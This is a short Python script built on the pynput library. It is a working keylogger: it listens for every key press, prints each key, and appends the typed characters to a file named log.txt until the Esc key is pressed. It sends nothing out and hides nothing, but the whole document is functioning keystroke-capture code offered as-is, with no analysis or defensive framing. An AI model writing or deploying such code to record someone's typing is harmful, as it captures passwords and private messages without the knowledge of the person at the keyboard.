import pynput
from pynput.keyboard import Key,Listener

count = 0
keys = []
def press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []




def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            x = str(key).replace("'","")
            if x.find("space") > 0:
                f.write('\n')
            elif x.find("Key")  == -1:
                f.write(x)


def release(key):
    if key == Key.esc:
        return False



with Listener(on_press=press, on_release=release) as listener:
    listener.join()